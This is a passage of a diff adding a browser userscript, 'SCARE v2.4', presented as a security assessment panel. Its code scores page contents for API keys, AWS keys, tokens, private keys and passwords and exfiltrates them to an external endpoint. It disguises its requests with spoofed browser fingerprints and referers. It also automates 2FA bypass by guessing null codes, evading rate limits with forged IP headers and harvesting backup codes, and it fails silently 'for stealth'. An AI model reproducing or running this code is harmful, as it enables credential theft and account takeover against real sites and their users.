+                    writable: 'writable' in (desc || {}) ? !!desc.writable : !!desc?.set,
+                    valuePreview: previewValue(val)
+                });
+            }
+
+            for (const sym of syms) {
+                const desc = Object.getOwnPropertyDescriptor(window, sym);
+                let val, type = 'unknown';
+                try { val = window[sym]; type = typeof val; } catch (e) { val = `[inaccessible: ${e.message}]`; }
+                rows.push({
+                    name: sym.toString(),
+                    type,
+                    enumerable: !!desc?.enumerable,
+                    configurable: !!desc?.configurable,
+                    writable: 'writable' in (desc || {}) ? !!desc.writable : !!desc?.set,
+                    valuePreview: previewValue(val)
+                });
+            }
+            return rows;
+        }
+
+        function detectWebpackRuntimes() {
+            const candidates = [];
+            const names = Object.getOwnPropertyNames(window);
+
+            for (const name of names) {
+                let val;
+                try { val = window[name]; } catch { continue; }
+
+                if (typeof val === 'function') {
+                    const m = safeGet(val, 'm'), c = safeGet(val, 'c');
+                    if (m && c && typeof m === 'object' && typeof c === 'object') {
+                        candidates.push({
+                            name,
+                            kind: 'require-fn',
+                            moduleCount: Object.keys(m).length,
+                            cacheSize: Object.keys(c).length,
+                            requireRef: val
+                        });
+                    }
+                }
+
+                if (Array.isArray(val) && /^webpackChunk/.test(name)) {
+                    candidates.push({
+                        name,
+                        kind: 'chunk-array',
+                        note: 'webpackChunk array detected',
+                        moduleCount: val.length,
+                        cacheSize: null,
+                        requireRef: null
+                    });
+                }
+            }
+
+            return candidates;
+        }
+
+        function runScan(options = {}) {
+            const t0 = now();
+            const globals = enumerateGlobals({ includeSymbols: true, includeNonEnumerable: true });
+            const runtimes = detectWebpackRuntimes();
+            const elapsedMs = Math.round(now() - t0);
+
+            return {
+                meta: { elapsedMs, timestamp: new Date().toISOString() },
+                globals,
+                webpack: { runtimes }
+            };
+        }
+
+        return { enumerateGlobals, detectWebpackRuntimes, runScan };
+    })();
+
+    // ADVANCED STEALTH REQUEST ENGINE
+    class StealthRequestEngine {
+        constructor() {
+            this.requestQueue = [];
+            this.lastRequestTime = 0;
+            this.legitimateSourceIndex = 0;
+            this.requestCount = 0;
+            this.legitimateSources = [
+                'https://cdn.jsdelivr.net', 'https://unpkg.com', 'https://cdnjs.cloudflare.com',
+                'https://ajax.googleapis.com', 'https://code.jquery.com', 'https://fonts.googleapis.com'
+            ];
+            this.fingerprints = {
+                chrome: {
+                    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                    acceptLanguage: 'en-US,en;q=0.9',
+                    acceptEncoding: 'gzip, deflate, br'
+                },
+                firefox: {
+                    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+                    acceptLanguage: 'en-US,en;q=0.5',
+                    acceptEncoding: 'gzip, deflate'
+                }
+            };
+            this.currentFingerprint = this.selectRandomFingerprint();
+        }
+        
+        selectRandomFingerprint() {
+            const browsers = Object.keys(this.fingerprints);
+            const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
+            return this.fingerprints[randomBrowser];
+        }
+        
+        generateStealthHeaders(url, options = {}) {
+            const legitimateReferers = [
+                'https://www.google.com/', 'https://github.com/', 'https://stackoverflow.com/', location.origin
+            ];
+            
+            return {
+                'User-Agent': this.currentFingerprint.userAgent,
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Language': this.currentFingerprint.acceptLanguage,
+                'Accept-Encoding': this.currentFingerprint.acceptEncoding,
+                'Referer': legitimateReferers[Math.floor(Math.random() * legitimateReferers.length)],
+                'Cache-Control': 'no-cache',
+                'X-Requested-With': Math.random() < 0.3 ? 'XMLHttpRequest' : undefined,
+                ...options.headers
+            };
+        }
+        
+        async executeStealthRequest(url, options = {}) {
+            // Rate limiting
+            const now = Date.now();
+            const timeSinceLastRequest = now - this.lastRequestTime;
+            const minDelay = 500; // Minimum 500ms between requests
+            
+            if (timeSinceLastRequest < minDelay) {
+                await new Promise(resolve => _0x1a2b._setTimeout(resolve, minDelay - timeSinceLastRequest));
+            }
+            
+            // Human-like delay occasionally
+            if (Math.random() < 0.2) {
+                await new Promise(resolve => _0x1a2b._setTimeout(resolve, Math.random() * 2000 + 500));
+            }
+            
+            // Rotate fingerprint occasionally
+            if (++this.requestCount % 10 === 0) {
+                this.currentFingerprint = this.selectRandomFingerprint();
+            }
+            
+            const stealthOptions = {
+                ...options,
+                headers: this.generateStealthHeaders(url, options),
+                credentials: 'include'
+            };
+            
+            if (CFG.proxySettings.enabled && CFG.proxySettings.url) {
+                stealthOptions.headers['X-Proxy-URL'] = CFG.proxySettings.url;
+            }
+            
+            this.lastRequestTime = Date.now();
+            
+            try {
+                return await fetch(url, stealthOptions);
+            } catch (error) {
+                log(`Stealth request failed: ${error.message}`, 'error');
+                throw error;
+            }
+        }
+    }
+    
+    const stealthEngine = new StealthRequestEngine();
+    
+    async function secureRequest(url, options = {}) {
+        return await stealthEngine.executeStealthRequest(url, options);
+    }
+
+    // AUTONOMOUS INTELLIGENCE ENGINE
+    const DATA_INTELLIGENCE = {
+        criticalPatterns: {
+            apiKeys: /(?:api[_-]?key|apikey)[\s]*[:=][\s]*["']?([a-zA-Z0-9_-]{20,})["']?/gi,
+            awsKeys: /(?:AKIA[0-9A-Z]{16}|aws[_-]?access[_-]?key)/gi,
+            jwtTokens: /eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g,
+            privateKeys: /-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----/gi,
+            dbConnections: /(?:mongodb|mysql|postgres|redis):\/\/[^\s"']+/gi,
+            secrets: /(?:secret|password|passwd|pwd)[\s]*[:=][\s]*["']?([^"'\s]{8,})["']?/gi,
+            tokens: /(?:token|auth[_-]?token|access[_-]?token)[\s]*[:=][\s]*["']?([a-zA-Z0-9_-]{16,})["']?/gi
+        },
+        
+        scoreData: function(data, category) {
+            let score = 0;
+            const content = JSON.stringify(data).toLowerCase();
+            
+            if (this.criticalPatterns.apiKeys.test(content)) score += 100;
+            if (this.criticalPatterns.awsKeys.test(content)) score += 150;
+            if (this.criticalPatterns.jwtTokens.test(content)) score += 80;
+            if (this.criticalPatterns.privateKeys.test(content)) score += 200;
+            if (this.criticalPatterns.dbConnections.test(content)) score += 120;
+            
+            if (content.includes('password') && content.includes('username')) score += 90;
+            if (content.includes('email') && content.includes('@')) score += 30;
+            if (/\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b/.test(content)) score += 70;
+            if (content.includes('admin') || content.includes('root')) score += 40;
+            
+            if (category === 'endpoint_leak') score += 50;
+            if (category === 'graphql_schema') score += 60;
+            
+            return score;
+        },
+        
+        shouldExfiltrate: function(data, category) {
+            const score = this.scoreData(data, category);
+            const dataSize = JSON.stringify(data).length;
+            
+            if (score >= 80) return true;
+            if (score < 20 && dataSize > 5000) return false;
+            if (dataSize < 50) return false;
+            
+            return score >= 30;
+        }
+    };
+    
+    // ENHANCED EXFILTRATION SERVICE
+    async function exfiltrateData(category, data, metadata = {}) {
+        // Intelligent filtering
+        if (!DATA_INTELLIGENCE.shouldExfiltrate(data, category)) {
+            log(`Skipping low-value data: ${category}`, 'info');
+            return null;
+        }
+        
+        const score = DATA_INTELLIGENCE.scoreData(data, category);
+        const exfilPacket = {
+            category,
+            data,
+            score,
+            metadata: {
+                ...metadata,
+                timestamp: Date.now(),
+                url: location.href,
+                userAgent: navigator.userAgent,
+                sourceIP: await getClientIP(),
+                runId: state.currentRunId,
+                priority: score >= 100 ? 'critical' : score >= 60 ? 'high' : 'medium'
+            }
+        };
+
+        try {
+            // Use multi-vector exfiltration engine
+            const vectorUsed = await multiVectorExfil.exfiltrate(exfilPacket);
+            
+            if (vectorUsed) {
+                log(`Data exfiltrated via ${vectorUsed} (Priority: ${exfilPacket.metadata.priority})`, 'success');
+            } else {
+                log(`All exfiltration vectors failed for ${category}`, 'error');
+            }
+        } catch (e) {
+            log(`Exfiltration failed: ${e.message}`, 'error');
+        }
+
+        return exfilPacket.id;
+    }
+    
+    function generateRandomIP() {
+        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+    }
+
+    async function getClientIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch {
+            return 'unknown';
+        }
+    }
+
+    function generateId() {
+        return Date.now().toString(36) + Math.random().toString(36).substr(2);
+    }
+
+    // LOGGING SYSTEM
+    function log(message, type = 'info') {
+        const timestamp = new Date().toLocaleTimeString();
+        const logEntry = {
+            timestamp,
+            message: stripEmojis(message),
+            type
+        };
+
+        state.logs.push(logEntry);
+
+        const logContainer = document.getElementById('scare-logs');
+        if (logContainer) {
+            const logElement = document.createElement('div');
+            logElement.className = `log-entry log-${type}`;
+            logElement.textContent = `[${timestamp}] ${logEntry.message}`;
+            logContainer.appendChild(logElement);
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
+
+        console.log(`[SCARE ${type.toUpperCase()}] ${logEntry.message}`);
+    }
+
+    // UI SETUP
+    function createSCAREPanel() {
+        // Remove any existing panel
+        const existingPanel = document.getElementById('scare-panel');
+        if (existingPanel) {
+            existingPanel.remove();
+        }
+        
+        const panel = document.createElement('div');
+        panel.id = 'scare-panel';
+
+    panel[_0x1a2b._innerHTML] = `
+        <div class="scare-header">
+            <h2>SCARE v2.4 - Sensitive Content and Recon Extractor</h2>
+            <div class="scare-controls">
+                <label>Opacity:</label>
+                <input type="range" id="opacity-slider" min="0.3" max="1" step="0.1" value="1">
+                <button class="scare-btn scare-btn-secondary" id="reset-btn">Reset</button>
+                <button class="scare-btn scare-btn-primary" id="export-btn">Export</button>
+                <button class="scare-btn scare-btn-danger" id="close-btn">×</button>
+            </div>
+        </div>
+        <div class="scare-content">
+            <div class="module-selection">
+                <h3>Security Assessment Modules</h3>
+                <div class="module-grid">
+                    ${CFG.modules.map(module => `
+                        <label class="module-item">
+                            <input type="checkbox" value="${module.key}" checked>
+                            <span>${module.label}</span>
+                        </label>
+                    `).join('')}
+                </div>
+                <div class="scan-controls">
+                    <button class="scare-btn scare-btn-primary" id="run-scan">Run Assessment</button>
+                    <button class="scare-btn scare-btn-secondary" id="stop-scan">Stop</button>
+                    <button class="scare-btn scare-btn-primary" id="auto-configure">Auto-Configure</button>
+                    <button class="scare-btn scare-btn-primary" id="dom-explorer">DOM Explorer</button>
+                    <button class="scare-btn scare-btn-primary" id="webpack-inspector-btn">Webpack Inspector</button>
+                    <input type="text" id="custom-payload" placeholder="Custom test payload..." style="width: 300px; margin-left: 10px;">
+                </div>
+            </div>
+
+            <div class="collapsible-header" id="proxy-toggle">
+                <span>Proxy & Exfiltration Endpoints</span>
+                <span class="caret">▶</span>
+            </div>
+            <div class="collapsible-content" id="proxy-content">
+                <div class="proxy-settings">
+                    <h4>Proxy Configuration</h4>
+                    <label>
+                        <input type="checkbox" id="proxy-enabled"> Enable Proxy
+                    </label>
+                    <input type="text" id="proxy-url" placeholder="Proxy URL (http://localhost:8080)" value="${CFG.proxySettings.url}">
+                    <h4>Collection Endpoints</h4>
+                    <input type="text" id="exfil-endpoint" placeholder="Data Exfiltration URL" value="${CFG.exfiltrationEndpoint}" style="width: 100%; margin-bottom: 5px;">
+                    <input type="text" id="traffic-endpoint" placeholder="Traffic Collection URL (http://localhost:3000/scare/traffic)" value="${CFG.trafficEndpoint || ''}" style="width: 100%;">
+                    <small style="color: #888;">Traffic endpoint forwards all network requests to external collector</small>
+                </div>
+            </div>
+
+            <div class="collapsible-header" id="exfil-toggle">
+                <span>Exfiltrated Data</span>
+                <span class="caret">▶</span>
+            </div>
+            <div class="collapsible-content" id="exfil-content">
+                <div id="exfiltrated-data">
+                    <p>No exfiltrated data yet</p>
+                </div>
+            </div>
+
+            <h3>Execute Exploit Center</h3>
+            <div class="exploit-center">
+                <button class="scare-btn scare-btn-exploit" id="launch-exploit-suite">Exploit Suite</button>
+            </div>
+
+            <h3>Current Run Findings</h3>
+            <table class="scare-table">
+                <thead>
+                    <tr>
+                        <th>Module</th>
+                        <th>Finding</th>
+                        <th>Severity</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="findings-table">
+                </tbody>
+            </table>
+
+            <h3>Live Terminal</h3>
+            <div class="log-container" id="scare-logs"></div>
+        </div>
+    `;
+
+    document.body.appendChild(panel);
+
+    // Event Listeners Setup
+    document.getElementById('opacity-slider').addEventListener('input', function() {
+        panel.style.opacity = this.value;
+    });
+
+    document.getElementById('reset-btn').addEventListener('click', resetState);
+    document.getElementById('export-btn').addEventListener('click', exportAll);
+    document.getElementById('close-btn').addEventListener('click', () => panel.remove());
+
+    document.getElementById('proxy-toggle').addEventListener('click', function() {
+        const caret = this.querySelector('.caret');
+        const content = document.getElementById('proxy-content');
+        safeToggle(caret, content);
+    });
+
+    document.getElementById('exfil-toggle').addEventListener('click', function() {
+        const caret = this.querySelector('.caret');
+        const content = document.getElementById('exfil-content');
+        safeToggle(caret, content);
+    });
+
+    document.getElementById('run-scan').addEventListener('click', runSelectedScans);
+    document.getElementById('stop-scan').addEventListener('click', stopScans);
+    document.getElementById('dom-explorer').addEventListener('click', launchDOMExplorer);
+    document.getElementById('webpack-inspector-btn').addEventListener('click', function() {
+        try {
+            const results = WebpackInspector.runScan();
+            log(`Webpack inspector scan complete: ${results.webpack.runtimes.length} runtime(s) found`, 'info');
+            createModal('Webpack Inspector Results', `<pre>${JSON.stringify(results, null, 2)}</pre>`);
+        } catch (error) {
+            log(`Webpack inspector error: ${error.message}`, 'error');
+        }
+    });
+
+    document.getElementById('launch-exploit-suite').addEventListener('click', launchExploitSuite);
+    document.getElementById('auto-configure').addEventListener('click', autoConfigureForSite);
+
+    // Fixed event delegation for dynamically created buttons
+    document.addEventListener('click', function(e) {
+        if (e.target.classList.contains('scare-view-btn')) {
+            const findingId = e.target.getAttribute('data-id');
+            viewFinding(findingId);
+        } else if (e.target.classList.contains('scare-data-btn')) {
+            const exfilId = e.target.getAttribute('data-id');
+            viewExfiltrated(exfilId);
+        } else if (e.target.classList.contains('scare-exploit-btn')) {
+            const findingId = e.target.getAttribute('data-id');
+            exploitFinding(findingId);
+        } else if (e.target.classList.contains('expand-btn')) {
+            const fullDiv = e.target.nextElementSibling;
+            const previewDiv = e.target.parentNode.querySelector('.exfil-preview');
+            if (fullDiv && previewDiv) {
+                if (fullDiv.style.display === 'none') {
+                    fullDiv.style.display = 'block';
+                    previewDiv.style.display = 'none';
+                    e.target.textContent = 'Show Less';
+                } else {
+                    fullDiv.style.display = 'none';
+                    previewDiv.style.display = 'block';
+                    e.target.textContent = 'Show Full Data';
+                }
+            }
+        }
+    });
+
+    // FUNCTIONS
+    function resetState() {
+        state.findings = [];
+        state.exfiltratedData = [];
+        state.logs = [];
+        unsafeWindow.SCARE_FINDINGS = [];
+        unsafeWindow.SCARE_EXFILTRATED = [];
+
+        document.getElementById('findings-table')[_0x1a2b._innerHTML] = '';
+        document.getElementById('scare-logs')[_0x1a2b._innerHTML] = '';
+        document.getElementById('exfiltrated-data')[_0x1a2b._innerHTML] = '<p>No exfiltrated data yet</p>';
+
+        log('State reset complete', 'info');
+    }
+
+    function exportAll() {
+        const exportData = {
+            findings: state.findings,
+            exfiltrated: state.exfiltratedData,
+            logs: state.logs,
+            timestamp: new Date().toISOString(),
+            url: location.href
+        };
+
+        const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `scare-export-${Date.now()}.json`;
+        a.click();
+        URL.revokeObjectURL(url);
+        log('Export complete', 'success');
+    }
+    
+    } // End of createSCAREPanel function
+
+    function stopScans() {
+        state.stopRequested = true;
+        log('Scan stop requested', 'warning');
+    }
+
+    async function runSelectedScans() {
+        state.stopRequested = false;
+        state.currentRunId = generateId();
+        log(`Starting new scan run: ${state.currentRunId}`, 'info');
+
+        const checkboxes = document.querySelectorAll('.module-item input[type="checkbox"]:checked');
+        const selectedModules = Array.from(checkboxes).map(cb => cb.value);
+
+        updateProxyConfig();
+
+        const startTime = Date.now();
+
+        for (const moduleKey of selectedModules) {
+            if (state.stopRequested) break;
+
+            log(`Starting module: ${moduleKey}`, 'info');
+
+            try {
+                switch (moduleKey) {
+                    case 'endpoints':
+                        await scanEndpoints();
+                        break;
+                    case 'graphql':
+                        await scanGraphQL();
+                        break;
+                    case 'cors':
+                        await scanCORS();
+                        break;
+                    case 'xss':
+                        await scanXSS();
+                        break;
+                    case 'dom':
+                        await scanDOM();
+                        break;
+                    case 'heap':
+                        await scanHeap();
+                        break;
+                    case 'jsleaks':
+                        await scanJSLeaks();
+                        break;
+                    case 'autofill':
+                        await scanAutofill();
+                        break;
+                    case '2fa':
+                        await scan2FABypass();
+                        break;
+                    case 'privesc':
+                        await scanPrivEscalation();
+                        break;
+                }
+
+                log(`Completed module: ${moduleKey}`, 'success');
+            } catch (error) {
+                log(`Module ${moduleKey} failed: ${error.message}`, 'error');
+            }
+        }
+
+        const duration = ((Date.now() - startTime) / 1000).toFixed(2);
+        const findingsCount = state.findings.filter(f => f.runId === state.currentRunId).length;
+        const exfilCount = state.exfiltratedData.filter(e => e.metadata.runId === state.currentRunId).length;
+
+        log(`Attack sequence complete in ${duration}s (${findingsCount} findings, ${exfilCount} exfiltrated)`, 'success');
+    }
+
+    function updateProxyConfig() {
+        const proxyEnabled = document.getElementById('proxy-enabled').checked;
+        const proxyUrl = document.getElementById('proxy-url').value;
+        const exfilEndpoint = document.getElementById('exfil-endpoint').value;
+        const trafficEndpoint = document.getElementById('traffic-endpoint').value;
+
+        CFG.proxySettings.enabled = proxyEnabled;
+        CFG.proxySettings.url = proxyUrl;
+        CFG.exfiltrationEndpoint = exfilEndpoint;
+        CFG.trafficEndpoint = trafficEndpoint;
+
+        // Configure traffic forwarding
+        if (trafficForwarder) {
+            trafficForwarder.configure(trafficEndpoint);
+            if (trafficEndpoint) {
+                trafficForwarder.startAutoFlush();
+            }
+        }
+
+        log(`Proxy: ${proxyEnabled ? 'Enabled at ' + proxyUrl : 'Disabled'}`, 'info');
+        log(`Exfiltration endpoint: ${exfilEndpoint}`, 'info');
+        log(`Traffic collection: ${trafficEndpoint || 'Disabled'}`, 'info');
+    }
+
+    function addFinding(module, finding, severity, data = {}, exfilId = null) {
+        const findingObj = {
+            id: generateId(),
+            module,
+            finding: stripEmojis(finding),
+            severity,
+            data,
+            timestamp: Date.now(),
+            runId: state.currentRunId,
+            exfilId
+        };
+
+        state.findings.push(findingObj);
+        unsafeWindow.SCARE_FINDINGS.push(findingObj);
+
+        const row = document.createElement('tr');
+        row[_0x1a2b._innerHTML] = `
+            <td>${module}</td>
+            <td>${stripEmojis(finding)}</td>
+            <td style="color: ${severity === 'high' ? '#e74c3c' : severity === 'medium' ? '#f39c12' : '#f1c40f'}">${severity.toUpperCase()}</td>
+            <td>
+                <button class="scare-btn scare-btn-secondary scare-view-btn" data-id="${findingObj.id}">View</button>
+                ${exfilId ? `<button class="scare-btn scare-btn-primary scare-data-btn" data-id="${exfilId}">Data</button>` : ''}
+                <button class="scare-btn scare-btn-danger scare-exploit-btn" data-id="${findingObj.id}">Exploit</button>
+            </td>
+        `;
+
+        document.getElementById('findings-table').appendChild(row);
+        log(`Finding added: ${stripEmojis(finding)} (${severity})`, 'info');
+    }
+
+    // FIXED: Enhanced exfiltration data display with 5000 character limit
+    function addExfiltratedData(category, data, metadata) {
+        const exfilObj = {
+            id: metadata.id || generateId(),
+            category,
+            data,
+            metadata,
+            timestamp: Date.now()
+        };
+
+        state.exfiltratedData.push(exfilObj);
+
+        const container = document.getElementById('exfiltrated-data');
+        if (container.querySelector('p')) {
+            container[_0x1a2b._innerHTML] = '';
+        }
+
+        const dataString = JSON.stringify(data, null, 2);
+        const isLarge = dataString.length > 200;
+
+        // Only show if there's actual meaningful data
+        if (dataString.length > 10 && dataString !== '{}' && dataString !== '[]') {
+            const item = document.createElement('div');
+            item.className = 'exfil-data-item';
+
+            const previewData = dataString.substring(0, 200);
+            const fullData = dataString.substring(0, 5000); // 5000 character limit as requested
+
+            item[_0x1a2b._innerHTML] = `
+                <div class="exfil-header">
+                    <span class="exfil-category">${category}</span>
+                    <span class="exfil-timestamp">${new Date(metadata.timestamp).toLocaleString()}</span>
+                </div>
+                <div class="exfil-preview">${previewData}${dataString.length > 200 ? '...' : ''}</div>
+                ${isLarge ? `
+                    <button class="expand-btn">Show Full Data</button>
+                    <div class="exfil-full">${fullData}${dataString.length > 5000 ? '\n\n... (truncated at 5000 chars)' : ''}</div>
+                ` : ''}
+            `;
+
+            container.appendChild(item);
+        }
+    }
+
+    function viewFinding(findingId) {
+        const finding = state.findings.find(f => f.id === findingId);
+        if (!finding) return;
+
+        createModal(`Finding: ${finding.finding}`, `<pre>${JSON.stringify(finding, null, 2)}</pre>`);
+    }
+
+    function viewExfiltrated(exfilId) {
+        const data = unsafeWindow.SCARE_EXFILTRATED.find(e => e.id === exfilId);
+        if (!data) {
+            log('Exfiltrated data not found', 'error');
+            return;
+        }
+
+        const fullContent = JSON.stringify(data, null, 2);
+        const truncatedContent = fullContent.substring(0, 5000);
+        const displayContent = fullContent.length > 5000 ?
+            truncatedContent + '\n\n... (truncated at 5000 chars for display)' :
+            fullContent;
+
+        createModal('Exfiltrated Data', `<pre>${displayContent}</pre>`);
+    }
+
+    function exploitFinding(findingId) {
+        const finding = state.findings.find(f => f.id === findingId);
+        if (!finding) return;
+
+        log(`Exploiting finding: ${finding.finding}`, 'info');
+
+        // Route to specific exploit based on module type
+        switch (finding.module) {
+            case 'endpoints':
+                launchEndpointExploit(finding);
+                break;
+            case 'jsleaks':
+                launchJSLeaksExploit(finding);
+                break;
+            case 'heap':
+                launchHeapExploit(finding);
+                break;
+            case 'dom':
+                launchDOMExploit(finding);
+                break;
+            case 'autofill':
+                launchAutofillExploit(finding);
+                break;
+            case 'cors':
+                launchCORSExploit(finding);
+                break;
+            case 'xss':
+                launchXSSExploit(finding);
+                break;
+            case 'graphql':
+                launchGraphQLExploit(finding);
+                break;
+            default:
+                launchGenericExploit(finding);
+        }
+    }
+
+    // FIXED: Modal system with proper close functionality and ESC key support
+    function createModal(title, content) {
+        const modal = document.createElement('div');
+        modal.className = 'scare-modal';
+        modal[_0x1a2b._innerHTML] = `
+            <div class="scare-modal-header">
+                <h2>${title}</h2>
+                <button class="scare-btn scare-btn-danger modal-close-btn">×</button>
+            </div>
+            <div>${content}</div>
+        `;
+
+        // Close button event
+        modal.querySelector('.modal-close-btn').addEventListener('click', function() {
+            modal.remove();
+        });
+
+        // ESC key support
+        const escHandler = function(e) {
+            if (e.key === 'Escape') {
+                modal.remove();
+                document.removeEventListener('keydown', escHandler);
+            }
+        };
+        document.addEventListener('keydown', escHandler);
+
+        // Click outside to close
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) {
+                modal.remove();
+                document.removeEventListener('keydown', escHandler);
+            }
+        });
+
+        document.body.appendChild(modal);
+        return modal;
+    }
+
+    // MODERN 2FA BYPASS MODULE
+    async function scan2FABypass() {
+        log('Analyzing 2FA implementation for bypass opportunities...', 'info');
+        
+        const twoFAFlows = unsafeWindow.SCARE_2FA_FLOWS || [];
+        const authFlows = unsafeWindow.SCARE_AUTH_FLOWS || [];
+        
+        if (twoFAFlows.length === 0) {
+            log('No 2FA flows detected - scanning for 2FA elements...', 'info');
+            await detect2FAElements();
+        }
+        
+        // Modern bypass techniques
+        await sessionManagementBypass();
+        await responseManipulationBypass();
+        await rateLimitEvasion();
+        await backupMethodDiscovery();
+        await totpSeedExtraction();
+        
+        log('2FA bypass analysis complete', 'success');
+    }
+    
+    async function detect2FAElements() {
+        // Look for 2FA UI elements
+        const twoFAIndicators = [
+            'input[name*="otp"]', 'input[name*="2fa"]', 'input[name*="mfa"]',
+            'input[name*="verify"]', 'input[name*="code"]', 'input[name*="token"]',
+            '[class*="2fa"]', '[class*="mfa"]', '[class*="otp"]',
+            '[id*="2fa"]', '[id*="mfa"]', '[id*="otp"]'
+        ];
+        
+        for (const selector of twoFAIndicators) {
+            const elements = document.querySelectorAll(selector);
+            if (elements.length > 0) {
+                addFinding('2fa', `2FA input detected: ${selector}`, 'medium', {
+                    selector,
+                    elementCount: elements.length,
+                    elements: Array.from(elements).map(el => ({
+                        tagName: el.tagName,
+                        name: el.name,
+                        id: el.id,
+                        className: el.className
+                    }))
+                });
+            }
+        }
+        
+        // Check for QR codes (TOTP setup)
+        const qrCodes = document.querySelectorAll('img[src*="qr"], canvas, [class*="qr"]');
+        if (qrCodes.length > 0) {
+            addFinding('2fa', `Potential TOTP QR codes found`, 'high', {
+                qrElements: qrCodes.length
+            });
+        }
+    }
+    
+    async function sessionManagementBypass() {
+        log('Testing session management bypasses...', 'info');
+        
+        const authFlows = unsafeWindow.SCARE_AUTH_FLOWS || [];
+        
+        for (const flow of authFlows) {
+            // Race condition test
+            if (flow.responseStatus === 200) {
+                try {
+                    // Attempt to use session before 2FA completion
+                    const testResponse = await stealthEngine.executeStealthRequest(location.origin + '/dashboard', {
+                        method: 'GET',
+                        headers: {
+                            'Cookie': document.cookie
+                        }
+                    });
+                    
+                    if (testResponse.status === 200) {
+                        const exfilId = await exfiltrateData('2fa_bypass', {
+                            type: 'session_fixation',
+                            url: flow.url,
+                            bypassed: true,
+                            response: await testResponse.text()
+                        });
+                        
+                        addFinding('2fa', 'Session fixation bypass - 2FA not enforced', 'high', {
+                            originalAuthUrl: flow.url,
+                            bypassUrl: location.origin + '/dashboard',
+                            method: 'session_fixation'
+                        }, exfilId);
+                    }
+                } catch (e) {
+                    log(`Session bypass test failed: ${e.message}`, 'info');
+                }
+            }
+        }
+    }
+    
+    async function responseManipulationBypass() {
+        log('Testing response manipulation bypasses...', 'info');
+        
+        const twoFAFlows = unsafeWindow.SCARE_2FA_FLOWS || [];
+        
+        for (const flow of twoFAFlows) {
+            // Test null/empty bypass
+            const nullTests = ['', 'null', '0', '000000', '123456'];
+            
+            for (const testCode of nullTests) {
+                try {
+                    const testBody = flow.requestBody ? 
+                        flow.requestBody.replace(/\d{4,8}/, testCode) : 
+                        JSON.stringify({ code: testCode, otp: testCode });
+                    
+                    const response = await stealthEngine.executeStealthRequest(flow.url, {
+                        method: flow.method,
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Cookie': document.cookie
+                        },
+                        body: testBody
+                    });
+                    
+                    const responseText = await response.text();
+                    
+                    // Look for success indicators
+                    if (response.status === 200 && 
+                        (responseText.includes('success') || 
+                         responseText.includes('valid') || 
+                         responseText.includes('authenticated'))) {
+                        
+                        const exfilId = await exfiltrateData('2fa_bypass', {
+                            type: 'null_bypass',
+                            testCode,
+                            url: flow.url,
+                            response: responseText,
+                            bypassed: true
+                        });
+                        
+                        addFinding('2fa', `2FA bypass with code: ${testCode}`, 'critical', {
+                            method: 'null_bypass',
+                            testCode,
+                            url: flow.url
+                        }, exfilId);
+                    }
+                } catch (e) {
+                    // Silent fail for stealth
+                }
+                
+                // Rate limiting delay
+                await new Promise(resolve => _0x1a2b._setTimeout(resolve, 1000));
+            }
+        }
+    }
+    
+    async function rateLimitEvasion() {
+        log('Analyzing rate limiting mechanisms...', 'info');
+        
+        const twoFAFlows = unsafeWindow.SCARE_2FA_FLOWS || [];
+        
+        for (const flow of twoFAFlows) {
+            // Test different evasion techniques
+            const evasionTechniques = [
+                { name: 'X-Forwarded-For', headers: { 'X-Forwarded-For': generateRandomIP() } },
+                { name: 'X-Real-IP', headers: { 'X-Real-IP': generateRandomIP() } },
+                { name: 'X-Originating-IP', headers: { 'X-Originating-IP': generateRandomIP() } },
+                { name: 'User-Agent rotation', headers: { 'User-Agent': stealthEngine.selectRandomFingerprint().userAgent } }
+            ];
+            
+            for (const technique of evasionTechniques) {
+                try {
+                    // Send multiple requests to test rate limiting
+                    const responses = [];
+                    for (let i = 0; i < 5; i++) {
+                        const response = await stealthEngine.executeStealthRequest(flow.url, {
+                            method: flow.method,
+                            headers: {
+                                ...technique.headers,
+                                'Content-Type': 'application/json'
+                            },
+                            body: flow.requestBody || JSON.stringify({ code: '000000' })
+                        });
+                        responses.push(response.status);
+                    }
+                    
+                    // Check if rate limiting was bypassed
+                    const successfulRequests = responses.filter(status => status !== 429).length;
+                    if (successfulRequests >= 4) {
+                        addFinding('2fa', `Rate limit bypass possible: ${technique.name}`, 'medium', {
+                            technique: technique.name,
+                            successfulRequests,
+                            totalRequests: 5
+                        });
+                    }
+                } catch (e) {
+                    // Silent fail
+                }
+            }
+        }
+    }
+    
+    async function backupMethodDiscovery() {
+        log('Discovering backup 2FA methods...', 'info');
+        
+        // Common backup method endpoints
+        const backupEndpoints = [
+            '/2fa/backup', '/auth/backup-codes', '/mfa/recovery',
+            '/account/recovery', '/auth/sms', '/auth/email',
+            '/2fa/disable', '/mfa/bypass', '/auth/recovery-codes'
+        ];
+        
+        for (const endpoint of backupEndpoints) {
+            try {
+                const response = await stealthEngine.executeStealthRequest(location.origin + endpoint, {
+                    method: 'GET',
+                    headers: { 'Cookie': document.cookie }
+                });
+                
+                if (response.status === 200) {
+                    const content = await response.text();
+                    
+                    // Look for backup codes in response
+                    const backupCodePattern = /\b[A-Z0-9]{8,12}\b/g;
+                    const codes = content.match(backupCodePattern) || [];
+                    
+                    if (codes.length > 0) {
+                        const exfilId = await exfiltrateData('2fa_backup_codes', {
+                            endpoint,
+                            codes,
+                            content: content.substring(0, 1000)
+                        });
+                        
+                        addFinding('2fa', `Backup codes exposed at ${endpoint}`, 'critical', {
+                            endpoint,
